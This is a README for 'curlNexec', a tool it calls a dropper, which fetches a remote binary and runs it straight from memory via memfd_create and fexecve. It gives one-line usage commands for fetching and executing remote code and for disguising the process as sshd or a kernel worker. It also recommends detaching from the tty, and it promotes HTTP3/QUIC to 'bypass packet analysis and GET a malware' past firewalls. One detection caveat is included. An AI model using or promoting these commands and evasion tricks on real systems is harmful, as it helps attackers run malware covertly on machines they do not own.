<h1 align=center> curlNexec </h1>

<div align="center">
<code>👋 Certainly useful , mainly for fun, rougly inspired by 0x00 <a href="https://0x00sec.org/t/super-stealthy-droppers/3715">article</a></code>
</div>

## Short story

`curlNexec` enable us to execute a remote binary on a local machine in one step

 - simple usage `curlNexec <binary_url>`
 - execute binary with specified program name: `curlNexec -n /usr/sbin/sshd <binary_raw_url>`
 - retrieve remote binary using http3 protocol and execute it: `curlNexec -http3 <binary_raw_url>`
 - detach program execution from `tty`: ` setsid curlNExec [...]` 

![demo](https://github.com/ariary/curlNexec/blob/main/img/curlNexec.gif)

<details>
  <summary><b>Explanation</b></summary>
We want to execute <code>writeNsleep</code> binary locate on a remote machine, locally. 

We first start a python http server on remote.
Locally we use <code>curlNexec</code> and impersonate the <code>/usr/sbin/sshd</code> name for the execution of the binary <code>writeNsleep</code>(for stealthiness & fun)

</details>

## Stealthiness story 

### memfd_create
The remote binary file is stored locally using `memfd_create` syscall, which store it within a _memory disk_ which is not mapped into the file system (*ie* you can't find it using `ls`).

### fexecve
Then we execute it using `fexecve` syscall (as it is currently not provided by `syscall` golang library we implem it). 

> With `fexecve` , we could but we reference the program to run using a
> file descriptor, instead of the full path.

### HTTP3/QUIC
<table><tr><td>
 Enable it with <code>-Q</code>/<code>http3</code>  flag.

You can setup a light web rootfs server supporting http3 by running `go run ./test/http3/light-server.go -p <listening_port>` (This is http3 equivalent of ` python3 -m http.server <listening_port>`)
 
use `test/http3/genkey.sh` to generate cert and key.

 
 </td></tr></table>
 
`QUIC` UDP aka `http3` is a new generation Internet protocol that speeds online web applications that are susceptible to delay, such as searching, video streaming etc., by reducing the round-trip time (RTT) needed to connect to a server.

Because QUIC uses proprietary encryption equivalent to TLS (this will change in the future with a standardized version), **3rd generation firewalls that provide application control and visibility encounter difficulties to control and monitor QUIC traffic**.

If you actually use `curlNexec` as a dropper (***Only for testing purpose or with the authorization***), you likely to execute some type of malwares or other file that could be drop by packet analysis. Hence, with Quic enables you could **bypass packet analysis and GET a malware**.

Also, in case firewall is only used for allowing/blocking traffic it could happen that **firewall rules forget the udp protocol making your requests go under the radars**

### other skill for stealthiness

Although not present on the memory disk, the running program can still be detected using `ps` command for example. 

 1. Cover the tracks with a fake program name
 
`curlNexec --name <fake_name> <binary_raw_url>` by default the name is `[kworker/u:0]` 
 2. Detach from tty to map behaviour of deamon process
 
`setsid curlNexec <binary_raw_url>`. *WIP call `setsid` from code*

### Caveats
You could still be detected with:
```
$ lsof | grep memfd
```
